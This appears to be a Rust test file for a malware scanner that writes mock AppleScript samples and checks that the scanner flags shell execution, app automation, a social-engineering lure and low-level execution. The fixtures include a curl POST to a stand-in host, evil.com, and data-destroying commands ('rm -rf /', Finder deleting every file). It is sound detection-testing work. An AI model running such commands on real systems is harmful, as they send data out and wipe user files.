use assert_cmd::Command;
use std::fs::File;
use std::io::Write;
use tempfile::TempDir;

#[test]
fn test_applescript_detection() -> Result<(), Box<dyn std::error::Error>> {
    let temp_dir = TempDir::new()?;
    let script_path = temp_dir.path().join("malicious.scpt");

    // Create a mock compiled AppleScript file
    // Magic bytes "Fasd" followed by some data containing our suspicious strings
    let mut file = File::create(&script_path)?;
    
    // Magic bytes
    file.write_all(b"Fasd")?;
    
    // Some padding
    file.write_all(&[0u8; 100])?;
    
    // Insert malicious strings that should trigger traits
    // 1. Shell execution
    file.write_all(b"do shell script \"curl -X POST http://evil.com\"")?;
    file.write_all(&[0u8; 10])?;
    
    // 2. App automation
    file.write_all(b"tell application \"System Settings\"")?;
    file.write_all(&[0u8; 10])?;
    
    // 3. Social engineering lure
    file.write_all(b"Compatibility Wizard")?;
    file.write_all(&[0u8; 10])?;
    
    // 4. Low-level execution
    file.write_all(b"sysoexec")?;
    file.write_all(&[0u8; 10])?;

    // Run dissect on the file
    let mut cmd = Command::cargo_bin("dissect")?;
    cmd.arg(&script_path);
    
    let cmd_assert = cmd.assert();
    let success = cmd_assert.success();
    let output = success.get_output();
    let stdout = String::from_utf8_lossy(&output.stdout);

    // Verify detections
    
    // Check file type detection implicitly by checking the traits that run
    
    // 1. Check for shell execution trait
    assert!(stdout.contains("do shell script"), "Missing shell script detection");
    
    // 2. Check for automation trait
    assert!(stdout.contains("tell application"), "Missing automation detection");
    
    // 3. Check for social engineering lure
    assert!(stdout.contains("social engineering lure"), "Missing lure detection");
    assert!(stdout.contains("Compatibility Wizard"), "Missing specific lure string");
    
    // 4. Check for low-level execution
    assert!(stdout.contains("sysoexec"), "Missing low-level execution detection");

    // 5. Verify NO false positives (NPM, Python, etc.)
    assert!(!stdout.contains("npm/scripts"), "False positive: NPM scripts detected");
    assert!(!stdout.contains("packaging/python"), "False positive: Python packaging detected");
    assert!(!stdout.contains("dropper/windows"), "False positive: Windows dropper detected");

    Ok(())
}

#[test]
fn test_applescript_plain_text() -> Result<(), Box<dyn std::error::Error>> {
    let temp_dir = TempDir::new()?;
    let script_path = temp_dir.path().join("malicious.applescript");

    // Create a plain text AppleScript file
    let mut file = File::create(&script_path)?;
    file.write_all(b"tell application \"Finder\" to delete every file")?;
    file.write_all(b"\ndo shell script \"rm -rf /\"")?;

    // Run dissect on the file
    let mut cmd = Command::cargo_bin("dissect")?;
    cmd.arg(&script_path);
    
    let cmd_assert = cmd.assert();
    let success = cmd_assert.success();
    let output = success.get_output();
    let stdout = String::from_utf8_lossy(&output.stdout);

    // Verify detections
    assert!(stdout.contains("do shell script"), "Missing shell script detection in text file");
    assert!(stdout.contains("tell application"), "Missing automation detection in text file");

    Ok(())
}
